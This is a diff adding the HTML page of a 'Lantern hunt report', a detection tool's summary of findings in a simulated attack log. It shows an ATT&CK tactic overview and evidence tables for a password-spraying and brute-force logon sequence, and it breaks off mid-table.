@@ -1,0 +1,542 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Lantern hunt report</title>
+<style>
+:root {
+  color-scheme: light;
+  --bg: #eef1f5; --surface: #ffffff; --ink: #1a2233; --muted: #5b6578; --rule: #d5dbe4;
+  --lamp: #e8a33d; --lamp-soft: #fbecd2; --lamp-ink: #5a3a06;
+  --critical: #b3261e; --high: #c4521f; --medium: #9a7400; --low: #4f6f8f; --info: #6f7887;
+  --serif: "Charter", "Iowan Old Style", "Palatino Linotype", "Book Antiqua", Georgia, serif;
+  --sans: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+  --mono: ui-monospace, "Cascadia Code", "SF Mono", Menlo, Consolas, monospace;
+}
+@media (prefers-color-scheme: dark) {
+  :root {
+    color-scheme: dark;
+    --bg: #141a26; --surface: #1c2433; --ink: #e6eaf2; --muted: #9aa4b5; --rule: #2c3546;
+    --lamp: #f2b454; --lamp-soft: #3a2f1c; --lamp-ink: #ffe2b0;
+    --critical: #ff7a70; --high: #f0915c; --medium: #e2c15a; --low: #8fb0d1; --info: #9aa4b5;
+  }
+}
+* { box-sizing: border-box; }
+html { -webkit-text-size-adjust: 100%; }
+body { margin: 0; background: var(--bg); color: var(--ink); font: 15px/1.55 var(--sans); }
+main { max-width: 1120px; margin: 0 auto; padding: 40px 24px 72px; }
+h1, h2 { font-family: var(--serif); font-weight: 600; letter-spacing: -0.01em; margin: 0; }
+h1 { font-size: 2.1rem; line-height: 1.15; }
+h2 { font-size: 1.35rem; margin: 48px 0 14px; }
+p { margin: 0; }
+a { color: inherit; text-decoration-color: var(--lamp); text-underline-offset: 2px; }
+a:hover { text-decoration-thickness: 2px; }
+:focus-visible { outline: 3px solid var(--lamp); outline-offset: 2px; border-radius: 3px; }
+code, .mono { font-family: var(--mono); font-size: 0.86em; }
+.lede { font-family: var(--serif); font-size: 1.25rem; line-height: 1.4; margin-top: 12px; max-width: 46em; }
+.meta { color: var(--muted); margin-top: 10px; font-size: 0.9rem; }
+
+/* The tactic path: the one bold element on the page. */
+.path { display: grid; grid-template-columns: repeat(12, minmax(0, 1fr)); gap: 4px; margin-top: 32px; }
+.tactic { position: relative; min-height: 104px; padding: 12px 10px; border-radius: 6px;
+  background: var(--surface); border: 1px solid var(--rule); color: var(--muted); display: flex;
+  flex-direction: column; justify-content: space-between; }
+.tactic .name { font-size: 0.8rem; line-height: 1.25; }
+.tactic .count { font-family: var(--serif); font-size: 1.6rem; line-height: 1; color: var(--rule); }
+.tactic.lit { background: var(--lamp-soft);
+  background: color-mix(in srgb, var(--lamp) calc(10% + var(--heat, 0.5) * 42%), var(--surface));
+  border-color: var(--lamp); color: var(--lamp-ink); box-shadow: 0 0 0 1px var(--lamp), 0 6px 22px -8px var(--lamp); }
+.tactic.lit .count { color: var(--lamp-ink); }
+.path-note { color: var(--muted); font-size: 0.85rem; margin-top: 8px; }
+
+.controls { display: flex; flex-wrap: wrap; gap: 8px; align-items: center; margin-bottom: 12px; }
+.controls button, .controls select { font: inherit; font-size: 0.88rem; padding: 5px 12px; border-radius: 999px;
+  border: 1px solid var(--rule); background: var(--surface); color: var(--ink); cursor: pointer; }
+.controls button[aria-pressed="false"] { opacity: 0.45; }
+.controls select { border-radius: 6px; }
+.shown { color: var(--muted); font-size: 0.85rem; margin-left: auto; }
+
+.findings { border-top: 1px solid var(--rule); }
+details.finding { border-bottom: 1px solid var(--rule); }
+details.finding > summary { list-style: none; cursor: pointer; display: grid;
+  grid-template-columns: 11.5em 6.5em minmax(0, 1fr) auto; gap: 14px; align-items: baseline; padding: 12px 6px; }
+details.finding > summary::-webkit-details-marker { display: none; }
+details.finding > summary:hover { background: var(--surface); }
+details.finding[open] > summary { background: var(--surface); }
+.when { font-family: var(--mono); font-size: 0.82rem; color: var(--muted); white-space: nowrap; }
+.title { font-weight: 600; }
+.title small { display: block; font-weight: 400; color: var(--muted); font-size: 0.86rem; margin-top: 2px;
+  overflow-wrap: anywhere; }
+.where { color: var(--muted); font-size: 0.86rem; text-align: right; white-space: nowrap; }
+.sev { font-size: 0.8rem; font-weight: 600; padding: 1px 9px; border-radius: 999px; justify-self: start;
+  border: 1px solid currentColor; }
+.sev.critical { color: #fff; background: var(--critical); border-color: var(--critical); }
+.sev.high { color: var(--high); } .sev.medium { color: var(--medium); }
+.sev.low { color: var(--low); } .sev.info { color: var(--info); }
+@media (prefers-color-scheme: dark) { .sev.critical { color: #1c2433; } }
+
+.body { padding: 4px 6px 22px calc(11.5em + 14px); background: var(--surface); }
+.body > * + * { margin-top: 14px; }
+.body .desc { max-width: 62em; }
+.facts { display: grid; grid-template-columns: max-content minmax(0, 1fr); gap: 4px 16px; font-size: 0.9rem; }
+.facts dt { color: var(--muted); } .facts dd { margin: 0; overflow-wrap: anywhere; }
+pre.decoded { margin: 0; padding: 12px 14px; border-left: 3px solid var(--lamp); background: var(--bg);
+  white-space: pre-wrap; overflow-wrap: anywhere; font-family: var(--mono); font-size: 0.84rem; }
+.evidence-wrap { overflow-x: auto; border: 1px solid var(--rule); border-radius: 6px; }
+table { border-collapse: collapse; width: 100%; font-size: 0.84rem; }
+th, td { text-align: left; padding: 6px 10px; border-bottom: 1px solid var(--rule); vertical-align: top; }
+th { color: var(--muted); font-weight: 500; background: var(--bg); position: sticky; top: 0; }
+td.kv { font-family: var(--mono); font-size: 0.8rem; overflow-wrap: anywhere; min-width: 24em; }
+td.nowrap { white-space: nowrap; }
+.more { color: var(--muted); font-size: 0.85rem; }
+
+.hosts { display: grid; grid-template-columns: repeat(auto-fill, minmax(320px, 1fr)); gap: 16px; }
+.host { background: var(--surface); border: 1px solid var(--rule); border-radius: 8px; padding: 16px 18px; }
+.host h3 { margin: 0 0 10px; font-size: 1rem; font-family: var(--serif); }
+.host ol { list-style: none; margin: 0; padding: 0 0 0 14px; border-left: 2px solid var(--rule); }
+.host li { position: relative; padding: 0 0 10px 10px; font-size: 0.88rem; }
+.host li::before { content: ""; position: absolute; left: -21px; top: 0.5em; width: 10px; height: 10px;
+  border-radius: 50%; background: var(--surface); border: 2px solid var(--muted); }
+.host li.critical::before { background: var(--critical); border-color: var(--critical); }
+.host li.high::before { border-color: var(--high); }
+.host li .when { display: block; }
+
+.quiet { color: var(--muted); }
+details.rules-off > summary { cursor: pointer; color: var(--muted); }
+details.rules-off ul { columns: 2 320px; margin: 10px 0 0; padding-left: 18px; color: var(--muted); font-size: 0.88rem; }
+footer { margin-top: 56px; color: var(--muted); font-size: 0.82rem; }
+
+@media (max-width: 860px) {
+  .path { grid-template-columns: repeat(4, minmax(0, 1fr)); }
+  details.finding > summary { grid-template-columns: 1fr auto; }
+  details.finding > summary .title { grid-column: 1 / -1; }
+  .where { text-align: left; }
+  .body { padding-left: 6px; }
+}
+@media (max-width: 520px) { .path { grid-template-columns: repeat(3, minmax(0, 1fr)); } h1 { font-size: 1.7rem; } }
+@media (prefers-reduced-motion: no-preference) {
+  .tactic.lit { animation: glow 1.4s ease-out both; }
+  @keyframes glow { from { box-shadow: 0 0 0 1px var(--lamp), 0 0 0 -8px var(--lamp); } }
+}
+@media print { .controls { display: none; } details.finding .body { display: block; } }
+</style>
+</head>
+<body>
+<main>
+  <h1>Lantern hunt report</h1>
+  <p class="lede">19 findings on 4 hosts between 02:10 and 09:14 UTC (5 critical, 12 high, 2 medium).</p>
+  <p class="meta">attack_scenario.jsonl: 1553 events from 6 hosts covering 2026-03-13 20:00:40 to 2026-03-14 10:03:35 UTC. 16 rules ran. Generated 2026-11-23 22:15:53 UTC.</p>
+
+  <div class="path" role="list" aria-label="MITRE ATT&amp;CK tactics with findings"><div class="tactic lit" style="--heat:0.50" role="listitem" aria-label="Initial Access: 3 findings"><span class="name">Initial Access</span><span class="count">3</span></div><div class="tactic lit" style="--heat:0.83" role="listitem" aria-label="Execution: 5 findings"><span class="name">Execution</span><span class="count">5</span></div><div class="tactic lit" style="--heat:1.00" role="listitem" aria-label="Persistence: 6 findings"><span class="name">Persistence</span><span class="count">6</span></div><div class="tactic lit" style="--heat:0.67" role="listitem" aria-label="Privilege Escalation: 4 findings"><span class="name">Privilege Escalation</span><span class="count">4</span></div><div class="tactic lit" style="--heat:0.50" role="listitem" aria-label="Defense Evasion: 3 findings"><span class="name">Defense Evasion</span><span class="count">3</span></div><div class="tactic lit" style="--heat:0.83" role="listitem" aria-label="Credential Access: 5 findings"><span class="name">Credential Access</span><span class="count">5</span></div><div class="tactic" role="listitem" aria-label="Discovery: 0 findings"><span class="name">Discovery</span><span class="count">0</span></div><div class="tactic lit" style="--heat:0.17" role="listitem" aria-label="Lateral Movement: 1 finding"><span class="name">Lateral Movement</span><span class="count">1</span></div><div class="tactic" role="listitem" aria-label="Collection: 0 findings"><span class="name">Collection</span><span class="count">0</span></div><div class="tactic lit" style="--heat:0.50" role="listitem" aria-label="Command and Control: 3 findings"><span class="name">Command and Control</span><span class="count">3</span></div><div class="tactic" role="listitem" aria-label="Exfiltration: 0 findings"><span class="name">Exfiltration</span><span class="count">0</span></div><div class="tactic lit" style="--heat:0.50" role="listitem" aria-label="Impact: 3 findings"><span class="name">Impact</span><span class="count">3</span></div></div>
+  <p class="path-note">MITRE ATT&amp;CK tactics in attack order. A finding counts toward every tactic its techniques belong to.</p>
+
+  <h2>Findings</h2>
+  
+<div class="controls" role="group" aria-label="Filter findings">
+  <button type="button" data-sev="critical" aria-pressed="true">Critical (5)</button><button type="button" data-sev="high" aria-pressed="true">High (12)</button><button type="button" data-sev="medium" aria-pressed="true">Medium (2)</button>
+  <select id="host-filter" aria-label="Filter by host"><option value="">All hosts</option><option value="DC01">DC01</option><option value="FS01">FS01</option><option value="WS-FIN-07">WS-FIN-07</option><option value="WS-HR-03">WS-HR-03</option></select>
+  <button type="button" id="expand">Expand all</button>
+  <span class="shown" id="shown" aria-live="polite"></span>
+</div>
+<div class="findings">
+<details class="finding" id="f1" data-sev="critical" data-hosts="WS-FIN-07">
+  <summary>
+    <span class="when">2026-03-14 02:10:04</span>
+    <span class="sev critical">Critical</span>
+    <span class="title">Successful logon after repeated failures<small>32 failed logons, then 1 successful logon in 10m 49s for IpAddress=203.0.113.45</small></span>
+    <span class="where">WS-FIN-07</span>
+  </summary>
+  <div class="body">
+    <p class="desc">A source that failed to log on several times then logged on successfully. This is the point where a guessing or spraying attempt turns into access, so it deserves a faster response than the failures alone.</p>
+    <dl class="facts"><dt>Rule</dt><dd>LNT-004 (sequence)</dd><dt>When</dt><dd>2026-03-14 02:10:04 to 2026-03-14 02:20:54 UTC</dd><dt>Hosts</dt><dd>WS-FIN-07.corp.local</dd><dt>ATT&CK</dt><dd><a href="https://attack.mitre.org/techniques/T1110/" target="_blank" rel="noopener">T1110 Brute Force</a>, <a href="https://attack.mitre.org/techniques/T1078/" target="_blank" rel="noopener">T1078 Valid Accounts</a></dd><dt>Tactics</dt><dd>Credential Access, Initial Access, Persistence, Privilege Escalation, Defense Evasion</dd><dt>Could also be</dt><dd>A user who mistyped their password several times before getting it right</dd></dl>
+    
+    <p class="quiet">Evidence (33 events)</p>
+    <div class="evidence-wrap"><table>
+      <thead><tr><th>Time (UTC)</th><th>Event</th><th>Host</th><th>Fields</th><th>Source</th></tr></thead>
+      <tbody><tr><td class="nowrap mono">2026-03-14 02:10:04</td><td>4625</td><td class="nowrap">WS-FIN-07</td><td class="kv"><span>IpAddress=</span>203.0.113.45<br><span>TargetUserName=</span>administrator<br><span>LogonType=</span>3</td><td class="nowrap mono">attack_scenario.jsonl:650</td></tr><tr><td class="nowrap mono">2026-03-14 02:10:22</td><td>4625</td><td class="nowrap">WS-FIN-07</td><td class="kv"><span>IpAddress=</span>203.0.113.45<br><span>TargetUserName=</span>j.alvarez<br><span>LogonType=</span>3</td><td class="nowrap mono">attack_scenario.jsonl:653</td></tr><tr><td class="nowrap mono">2026-03-14 02:10:45</td><td>4625</td><td class="nowrap">WS-FIN-07</td><td class="kv"><span>IpAddress=</span>203.0.113.45<br><span>TargetUserName=</span>m.chen<br><span>LogonType=</span>3</td><td class="nowrap mono">attack_scenario.jsonl:654</td></tr><tr><td class="nowrap mono">2026-03-14 02:11:06</td><td>4625</td><td class="nowrap">WS-FIN-07</td><td class="kv"><span>IpAddress=</span>203.0.113.45<br><span>TargetUserName=</span>s.patel<br><span>LogonType=</span>3</td><td class="nowrap mono">attack_scenario.jsonl:655</td></tr><tr><td class="nowrap mono">2026-03-14 02:11:34</td><td>4625</td><td class="nowrap">WS-FIN-07</td><td class="kv"><span>IpAddress=</span>203.0.113.45<br><span>TargetUserName=</span>backup<br><span>LogonType=</span>3</td><td class="nowrap mono">attack_scenario.jsonl:656</td></tr><tr><td class="nowrap mono">2026-03-14 02:12:00</td><td>4625</td><td class="nowrap">WS-FIN-07</td><td class="kv"><span>IpAddress=</span>203.0.113.45<br><span>TargetUserName=</span>d.okafor<br><span>LogonType=</span>3</td><td class="nowrap mono">attack_scenario.jsonl:657</td></tr><tr><td class="nowrap mono">2026-03-14 02:12:19</td><td>4625</td><td class="nowrap">WS-FIN-07</td><td class="kv"><span>IpAddress=</span>203.0.113.45<br><span>TargetUserName=</span>l.nguyen<br><span>LogonType=</span>3</td><td class="nowrap mono">attack_scenario.jsonl:658</td></tr><tr><td class="nowrap mono">2026-03-14 02:12:56</td><td>4625</td><td class="nowrap">WS-FIN-07</td><td class="kv"><span>IpAddress=</span>203.0.113.45<br><span>TargetUserName=</span>helpdesk<br><span>LogonType=</span>3</td><td class="nowrap mono">attack_scenario.jsonl:659</td></tr><tr><td class="nowrap mono">2026-03-14 02:13:17</td><td>4625</td><td class="nowrap">WS-FIN-07</td><td class="kv"><span>IpAddress=</span>203.0.113.45<br><span>TargetUserName=</span>t.brooks<br><span>LogonType=</span>3</td><td class="nowrap mono">attack_scenario.jsonl:660</td></tr><tr><td class="nowrap mono">2026-03-14 02:13:46</td><td>4625</td><td class="nowrap">WS-FIN-07</td><td class="kv"><span>IpAddress=</span>203.0.113.45<br><span>TargetUserName=</span>e.rossi<br><span>LogonType=</span>3</td><td class="nowrap mono">attack_scenario.jsonl:664</td></tr><tr><td class="nowrap mono">2026-03-14 02:14:10</td><td>4625</td><td class="nowrap">WS-FIN-07</td><td class="kv"><span>IpAddress=</span>203.0.113.45<br><span>TargetUserName=</span>scanner<br><span>LogonType=</span>3</td><td class="nowrap mono">attack_scenario.jsonl:665</td></tr><tr><td class="nowrap mono">2026-03-14 02:14:30</td><td>4625</td><td class="nowrap">WS-FIN-07</td><td class="kv"><span>IpAddress=</span>203.0.113.45<br><span>TargetUserName=</span>p.mensah<br><span>LogonType=</span>3</td><td class="nowrap mono">attack_scenario.jsonl:666</td></tr><tr><td class="nowrap mono">2026-03-14 02:15:07</td><td>4625</td><td class="nowrap">WS-FIN-07</td><td class="kv"><span>IpAddress=</span>203.0.113.45<br><span>TargetUserName=</span>c.dubois<br><span>LogonType=</span>3</td><td class="nowrap mono">attack_scenario.jsonl:667</td></tr><tr><td class="nowrap mono">2026-03-14 02:15:38</td><td>4625</td><td class="nowrap">WS-FIN-07</td><td class="kv"><span>IpAddress=</span>203.0.113.45<br><span>TargetUserName=</span>n.ivanova<br><span>LogonType=</span>3</td><td class="nowrap mono">attack_scenario.jsonl:668</td></tr><tr><td class="nowrap mono">2026-03-14 02:16:47</td><td>4625</td><td class="nowrap">WS-FIN-07</td><td class="kv"><span>IpAddress=</span>203.0.113.45<br><span>TargetUserName=</span>j.alvarez<br><span>LogonType=</span>3</td><td class="nowrap mono">attack_scenario.jsonl:669</td></tr><tr><td class="nowrap mono">2026-03-14 02:16:59</td><td>4625</td><td class="nowrap">WS-FIN-07</td><td class="kv"><span>IpAddress=</span>203.0.113.45<br><span>TargetUserName=</span>j.alvarez<br><span>LogonType=</span>3</td><td class="nowrap mono">attack_scenario.jsonl:672</td></tr><tr><td class="nowrap mono">2026-03-14 02:17:12</td><td>4625</td><td class="nowrap">WS-FIN-07</td><td class="kv"><span>IpAddress=</span>203.0.113.45<br><span>TargetUserName=</span>j.alvarez<br><span>LogonType=</span>3</td><td class="nowrap mono">attack_scenario.jsonl:674</td></tr><tr><td class="nowrap mono">2026-03-14 02:17:29</td><td>4625</td><td class="nowrap">WS-FIN-07</td><td class="kv"><span>IpAddress=</span>203.0.113.45<br><span>TargetUserName=</span>j.alvarez<br><span>LogonType=</span>3</td><td class="nowrap mono">attack_scenario.jsonl:675</td></tr><tr><td class="nowrap mono">2026-03-14 02:17:44</td><td>4625</td><td class="nowrap">WS-FIN-07</td><td class="kv"><span>IpAddress=</span>203.0.113.45<br><span>TargetUserName=</span>j.alvarez<br><span>LogonType=</span>3</td><td class="nowrap mono">attack_scenario.jsonl:676</td></tr><tr><td class="nowrap mono">2026-03-14 02:17:56</td><td>4625</td><td class="nowrap">WS-FIN-07</td><td class="kv"><span>IpAddress=</span>203.0.113.45<br><span>TargetUserName=</span>j.alvarez<br><span>LogonType=</span>3</td><td class="nowrap mono">attack_scenario.jsonl:677</td></tr><tr><td class="nowrap mono">2026-03-14 02:18:07</td><td>4625</td><td class="nowrap">WS-FIN-07</td><td class="kv"><span>IpAddress=</span>203.0.113.45<br><span>TargetUserName=</span>j.alvarez<br><span>LogonType=</span>3</td><td class="nowrap mono">attack_scenario.jsonl:678</td></tr><tr><td class="nowrap mono">2026-03-14 02:18:16</td><td>4625</td><td class="nowrap">WS-FIN-07</td><td class="kv"><span>IpAddress=</span>203.0.113.45<br><span>TargetUserName=</span>j.alvarez<br><span>LogonType=</span>3</td><td class="nowrap mono">attack_scenario.jsonl:679</td></tr><tr><td class="nowrap mono">2026-03-14 02:18:31</td><td>4625</td><td class="nowrap">WS-FIN-07</td><td class="kv"><span>IpAddress=</span>203.0.113.45<br><span>TargetUserName=</span>j.alvarez<br><span>LogonType=</span>3</td><td class="nowrap mono">attack_scenario.jsonl:680</td></tr><tr><td class="nowrap mono">2026-03-14 02:18:48</td><td>4625</td><td class="nowrap">WS-FIN-07</td><td class="kv"><span>IpAddress=</span>203.0.113.45<br><span>TargetUserName=</span>j.alvarez<br><span>LogonType=</span>3</td><td class="nowrap mono">attack_scenario.jsonl:681</td></tr><tr><td class="nowrap mono">2026-03-14 02:19:03</td><td>4625</td><td class="nowrap">WS-FIN-07</td><td class="kv"><span>IpAddress=</span>203.0.113.45<br><span>TargetUserName=</span>j.alvarez<br><span>LogonType=</span>3</td><td class="nowrap mono">attack_scenario.jsonl:682</td></tr><tr><td class="nowrap mono">2026-03-14 02:19:15</td><td>4625</td><td class="nowrap">WS-FIN-07</td><td class="kv"><span>IpAddress=</span>203.0.113.45<br><span>TargetUserName=</span>j.alvarez<br><span>LogonType=</span>3</td><td class="nowrap mono">attack_scenario.jsonl:683</td></tr><tr><td class="nowrap mono">2026-03-14 02:19:31</td><td>4625</td><td class="nowrap">WS-FIN-07</td><td class="kv"><span>IpAddress=</span>203.0.113.45<br><span>TargetUserName=</span>j.alvarez<br><span>LogonType=</span>3</td><td class="nowrap mono">attack_scenario.jsonl:684</td></tr><tr><td class="nowrap mono">2026-03-14 02:19:48</td><td>4625</td><td class="nowrap">WS-FIN-07</td><td class="kv"><span>IpAddress=</span>203.0.113.45<br><span>TargetUserName=</span>j.alvarez<br><span>LogonType=</span>3</td><td class="nowrap mono">attack_scenario.jsonl:685</td></tr><tr><td class="nowrap mono">2026-03-14 02:20:01</td><td>4625</td><td class="nowrap">WS-FIN-07</td><td class="kv"><span>IpAddress=</span>203.0.113.45<br><span>TargetUserName=</span>j.alvarez<br><span>LogonType=</span>3</td><td class="nowrap mono">attack_scenario.jsonl:686</td></tr><tr><td class="nowrap mono">2026-03-14 02:20:13</td><td>4625</td><td class="nowrap">WS-FIN-07</td><td class="kv"><span>IpAddress=</span>203.0.113.45<br><span>TargetUserName=</span>j.alvarez<br><span>LogonType=</span>3</td><td class="nowrap mono">attack_scenario.jsonl:687</td></tr><tr><td class="nowrap mono">2026-03-14 02:20:24</td><td>4625</td><td class="nowrap">WS-FIN-07</td><td class="kv"><span>IpAddress=</span>203.0.113.45<br><span>TargetUserName=</span>j.alvarez<br><span>LogonType=</span>3</td><td class="nowrap mono">attack_scenario.jsonl:690</td></tr><tr><td class="nowrap mono">2026-03-14 02:20:37</td><td>4625</td><td class="nowrap">WS-FIN-07</td><td class="kv"><span>IpAddress=</span>203.0.113.45<br><span>TargetUserName=</span>j.alvarez<br><span>LogonType=</span>3</td><td class="nowrap mono">attack_scenario.jsonl:691</td></tr><tr><td class="nowrap mono">2026-03-14 02:20:54</td><td>4624</td><td class="nowrap">WS-FIN-07</td><td class="kv"><span>IpAddress=</span>203.0.113.45<br><span>TargetUserName=</span>j.alvarez<br><span>LogonType=</span>10</td><td class="nowrap mono">attack_scenario.jsonl:692</td></tr></tbody>
+    </table></div>
+    
+  </div>
+</details>
+<details class="finding" id="f2" data-sev="high" data-hosts="WS-FIN-07">
+  <summary>
+    <span class="when">2026-03-14 02:10:04</span>
+    <span class="sev high">High</span>
+    <span class="title">Password spraying from a single source<small>14 distinct TargetUserName values in 10m 32s from IpAddress=203.0.113.45</small></span>
+    <span class="where">WS-FIN-07</span>
+  </summary>
+  <div class="body">
+    <p class="desc">One source address failed to log on as many different accounts in a short time. Spraying tries one or two common passwords against many accounts to stay under per-account lockout thresholds.</p>
+    <dl class="facts"><dt>Rule</dt><dd>LNT-002 (threshold)</dd><dt>When</dt><dd>2026-03-14 02:10:04 to 2026-03-14 02:20:37 UTC</dd><dt>Hosts</dt><dd>WS-FIN-07.corp.local</dd><dt>ATT&CK</dt><dd><a href="https://attack.mitre.org/techniques/T1110/003/" target="_blank" rel="noopener">T1110.003 Brute Force: Password Spraying</a></dd><dt>Tactics</dt><dd>Credential Access</dd><dt>Could also be</dt><dd>A misconfigured service or shared kiosk cycling through stale credentials</dd></dl>
+    
+    <p class="quiet">Evidence (32 events)</p>
+    <div class="evidence-wrap"><table>
+      <thead><tr><th>Time (UTC)</th><th>Event</th><th>Host</th><th>Fields</th><th>Source</th></tr></thead>
+      <tbody><tr><td class="nowrap mono">2026-03-14 02:10:04</td><td>4625</td><td class="nowrap">WS-FIN-07</td><td class="kv"><span>IpAddress=</span>203.0.113.45<br><span>TargetUserName=</span>administrator<br><span>LogonType=</span>3<br><span>WorkstationName=</span>DESKTOP-R4F9TQ1</td><td class="nowrap mono">attack_scenario.jsonl:650</td></tr><tr><td class="nowrap mono">2026-03-14 02:10:22</td><td>4625</td><td class="nowrap">WS-FIN-07</td><td class="kv"><span>IpAddress=</span>203.0.113.45<br><span>TargetUserName=</span>j.alvarez<br><span>LogonType=</span>3<br><span>WorkstationName=</span>DESKTOP-R4F9TQ1</td><td class="nowrap mono">attack_scenario.jsonl:653</td></tr><tr><td class="nowrap mono">2026-03-14 02:10:45</td><td>4625</td><td class="nowrap">WS-FIN-07</td><td class="kv"><span>IpAddress=</span>203.0.113.45<br><span>TargetUserName=</span>m.chen<br><span>LogonType=</span>3<br><span>WorkstationName=</span>DESKTOP-R4F9TQ1</td><td class="nowrap mono">attack_scenario.jsonl:654</td></tr><tr><td class="nowrap mono">2026-03-14 02:11:06</td><td>4625</td><td class="nowrap">WS-FIN-07</td><td class="kv"><span>IpAddress=</span>203.0.113.45<br><span>TargetUserName=</span>s.patel<br><span>LogonType=</span>3<br><span>WorkstationName=</span>DESKTOP-R4F9TQ1</td><td class="nowrap mono">attack_scenario.jsonl:655</td></tr><tr><td class="nowrap mono">2026-03-14 02:11:34</td><td>4625</td><td class="nowrap">WS-FIN-07</td><td class="kv"><span>IpAddress=</span>203.0.113.45<br><span>TargetUserName=</span>backup<br><span>LogonType=</span>3<br><span>WorkstationName=</span>DESKTOP-R4F9TQ1</td><td class="nowrap mono">attack_scenario.jsonl:656</td></tr><tr><td class="nowrap mono">2026-03-14 02:12:00</td><td>4625</td><td class="nowrap">WS-FIN-07</td><td class="kv"><span>IpAddress=</span>203.0.113.45<br><span>TargetUserName=</span>d.okafor<br><span>LogonType=</span>3<br><span>WorkstationName=</span>DESKTOP-R4F9TQ1</td><td class="nowrap mono">attack_scenario.jsonl:657</td></tr><tr><td class="nowrap mono">2026-03-14 02:12:19</td><td>4625</td><td class="nowrap">WS-FIN-07</td><td class="kv"><span>IpAddress=</span>203.0.113.45<br><span>TargetUserName=</span>l.nguyen<br><span>LogonType=</span>3<br><span>WorkstationName=</span>DESKTOP-R4F9TQ1</td><td class="nowrap mono">attack_scenario.jsonl:658</td></tr><tr><td class="nowrap mono">2026-03-14 02:12:56</td><td>4625</td><td class="nowrap">WS-FIN-07</td><td class="kv"><span>IpAddress=</span>203.0.113.45<br><span>TargetUserName=</span>helpdesk<br><span>LogonType=</span>3<br><span>WorkstationName=</span>DESKTOP-R4F9TQ1</td><td class="nowrap mono">attack_scenario.jsonl:659</td></tr><tr><td class="nowrap mono">2026-03-14 02:13:17</td><td>4625</td><td class="nowrap">WS-FIN-07</td><td class="kv"><span>IpAddress=</span>203.0.113.45<br><span>TargetUserName=</span>t.brooks<br><span>LogonType=</span>3<br><span>WorkstationName=</span>DESKTOP-R4F9TQ1</td><td class="nowrap mono">attack_scenario.jsonl:660</td></tr><tr><td class="nowrap mono">2026-03-14 02:13:46</td><td>4625</td><td class="nowrap">WS-FIN-07</td><td class="kv"><span>IpAddress=</span>203.0.113.45<br><span>TargetUserName=</span>e.rossi<br><span>LogonType=</span>3<br><span>WorkstationName=</span>DESKTOP-R4F9TQ1</td><td class="nowrap mono">attack_scenario.jsonl:664</td></tr><tr><td class="nowrap mono">2026-03-14 02:14:10</td><td>4625</td><td class="nowrap">WS-FIN-07</td><td class="kv"><span>IpAddress=</span>203.0.113.45<br><span>TargetUserName=</span>scanner<br><span>LogonType=</span>3<br><span>WorkstationName=</span>DESKTOP-R4F9TQ1</td><td class="nowrap mono">attack_scenario.jsonl:665</td></tr><tr><td class="nowrap mono">2026-03-14 02:14:30</td><td>4625</td><td class="nowrap">WS-FIN-07</td><td class="kv"><span>IpAddress=</span>203.0.113.45<br><span>TargetUserName=</span>p.mensah<br><span>LogonType=</span>3<br><span>WorkstationName=</span>DESKTOP-R4F9TQ1</td><td class="nowrap mono">attack_scenario.jsonl:666</td></tr><tr><td class="nowrap mono">2026-03-14 02:15:07</td><td>4625</td><td class="nowrap">WS-FIN-07</td><td class="kv"><span>IpAddress=</span>203.0.113.45<br><span>TargetUserName=</span>c.dubois<br><span>LogonType=</span>3<br><span>WorkstationName=</span>DESKTOP-R4F9TQ1</td><td class="nowrap mono">attack_scenario.jsonl:667</td></tr><tr><td class="nowrap mono">2026-03-14 02:15:38</td><td>4625</td><td class="nowrap">WS-FIN-07</td><td class="kv"><span>IpAddress=</span>203.0.113.45<br><span>TargetUserName=</span>n.ivanova<br><span>LogonType=</span>3<br><span>WorkstationName=</span>DESKTOP-R4F9TQ1</td><td class="nowrap mono">attack_scenario.jsonl:668</td></tr><tr><td class="nowrap mono">2026-03-14 02:16:47</td><td>4625</td><td class="nowrap">WS-FIN-07</td><td class="kv"><span>IpAddress=</span>203.0.113.45<br><span>TargetUserName=</span>j.alvarez<br><span>LogonType=</span>3<br><span>WorkstationName=</span>DESKTOP-R4F9TQ1</td><td class="nowrap mono">attack_scenario.jsonl:669</td></tr><tr><td class="nowrap mono">2026-03-14 02:16:59</td><td>4625</td><td class="nowrap">WS-FIN-07</td><td class="kv"><span>IpAddress=</span>203.0.113.45<br><span>TargetUserName=</span>j.alvarez<br><span>LogonType=</span>3<br><span>WorkstationName=</span>DESKTOP-R4F9TQ1</td><td class="nowrap mono">attack_scenario.jsonl:672</td></tr><tr><td class="nowrap mono">2026-03-14 02:17:12</td><td>4625</td><td class="nowrap">WS-FIN-07</td><td class="kv"><span>IpAddress=</span>203.0.113.45<br><span>TargetUserName=</span>j.alvarez<br><span>LogonType=</span>3<br><span>WorkstationName=</span>DESKTOP-R4F9TQ1</td><td class="nowrap mono">attack_scenario.jsonl:674</td></tr><tr><td class="nowrap mono">2026-03-14 02:17:29</td><td>4625</td><td class="nowrap">WS-FIN-07</td><td class="kv"><span>IpAddress=</span>203.0.113.45<br><span>TargetUserName=</span>j.alvarez<br><span>LogonType=</span>3<br><span>WorkstationName=</span>DESKTOP-R4F9TQ1</td><td class="nowrap mono">attack_scenario.jsonl:675</td></tr><tr><td class="nowrap mono">2026-03-14 02:17:44</td><td>4625</td><td class="nowrap">WS-FIN-07</td><td class="kv"><span>IpAddress=</span>203.0.113.45<br><span>TargetUserName=</span>j.alvarez<br><span>LogonType=</span>3<br><span>WorkstationName=</span>DESKTOP-R4F9TQ1</td><td class="nowrap mono">attack_scenario.jsonl:676</td></tr><tr><td class="nowrap mono">2026-03-14 02:17:56</td><td>4625</td><td class="nowrap">WS-FIN-07</td><td class="kv"><span>IpAddress=</span>203.0.113.45<br><span>TargetUserName=</span>j.alvarez<br><span>LogonType=</span>3<br><span>WorkstationName=</span>DESKTOP-R4F9TQ1</td><td class="nowrap mono">attack_scenario.jsonl:677</td></tr><tr><td class="nowrap mono">2026-03-14 02:18:07</td><td>4625</td><td class="nowrap">WS-FIN-07</td><td class="kv"><span>IpAddress=</span>203.0.113.45<br><span>TargetUserName=</span>j.alvarez<br><span>LogonType=</span>3<br><span>WorkstationName=</span>DESKTOP-R4F9TQ1</td><td class="nowrap mono">attack_scenario.jsonl:678</td></tr><tr><td class="nowrap mono">2026-03-14 02:18:16</td><td>4625</td><td class="nowrap">WS-FIN-07</td><td class="kv"><span>IpAddress=</span>203.0.113.45<br><span>TargetUserName=</span>j.alvarez<br><span>LogonType=</span>3<br><span>WorkstationName=</span>DESKTOP-R4F9TQ1</td><td class="nowrap 